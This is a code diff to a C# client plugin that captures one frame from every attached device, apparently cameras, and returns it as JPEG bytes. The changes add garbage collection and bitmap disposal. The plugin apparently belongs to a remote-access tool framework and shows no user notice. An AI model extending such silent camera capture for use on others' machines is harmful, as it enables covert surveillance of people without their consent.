@@ -1,4 +1,6 @@
 ﻿using Pulsar.Common.Plugins;
+using System;
+using System.Threading;
 
 namespace Pulsar.Plugin.UserCheck.Client
 {
@@ -43,6 +45,11 @@ namespace Pulsar.Plugin.UserCheck.Client
             var captureTask = snapshot.CaptureSingleFrameFromAllDevices();
             captureTask.Wait();
 
+            Thread.Sleep(500);
+            GC.Collect();
+            GC.WaitForPendingFinalizers();
+            GC.Collect();
+
             if (snapshot.Frames.Count == 0)
             {
                 return new PluginResult
@@ -53,18 +60,24 @@ namespace Pulsar.Plugin.UserCheck.Client
                 };
             }
 
-            //return the first one
             foreach (var frame in snapshot.Frames)
             {
                 using (var ms = new System.IO.MemoryStream())
                 {
                     frame.Value.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    return new PluginResult
+                    var result = new PluginResult
                     {
                         Success = true,
                         Data = ms.ToArray(),
                         ShouldUnload = true
                     };
+
+                    foreach (var bmp in snapshot.Frames.Values)
+                    {
+                        bmp?.Dispose();
+                    }
+
+                    return result;
                 }
             }
 
